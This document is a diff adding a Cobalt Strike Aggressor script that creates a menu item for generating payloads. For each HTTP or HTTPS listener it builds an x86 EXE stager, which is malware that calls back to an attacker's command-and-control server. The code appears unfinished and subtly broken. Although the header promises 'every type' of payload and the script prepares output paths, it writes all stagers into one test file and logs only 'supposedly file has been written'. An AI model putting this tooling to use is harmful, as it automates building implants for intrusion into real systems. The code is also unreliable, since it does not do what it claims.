@@ -1,0 +1,39 @@
+#Automatic Artifact Payload Generator
+#Author: @r3dQu1nn
+#Generates every type of Stageless/Staged Payload based off a HTTP/HTTPS Listener
+
+#Custom Directory for Payloads
+mkdir("/opt/cobaltstrike/Staged_Payloads");
+mkdir("/opt/cobaltstrike/Stageless_Payloads");
+
+menubar("Payload Generator", "payloadgenerator", 2);
+popup payloadgenerator {
+	item "&Automatic Artifact Payload Generator" {
+		prompt_confirm("Do you want to generate all the different types of Artifacts?", "Payload Generator Confirmation", {
+			show_message("Generating Artifacts...");
+			payloadgenerate();
+		});
+	}
+}
+
+sub payloadgenerate {
+               
+			   foreach $name (listeners_local()) {
+                        $original_listener = $name;
+                        $payloadType = listener_info($name)['payload'];
+						$listenerName = listener_info($name)['name'];
+                        if ($payloadType hasmatch "http" || $payloadType hasmatch "https") {
+
+                                $path = ">/tmp/staged_";
+                                $dataexe86 = artifact_stager($listenerName, "exe", "x86");
+                                $filename = $listenerName . "_x86.exe";
+								$fullpath = $path . $filename;
+                                $handle = openf(">>/tmp/quicktest.txt");
+                                elog($listenerName); 
+								writeb($handle, $dataexe86);
+                                closef($handle);
+								elog("supposedly file has been written");
+	
+			}
+        }
+}
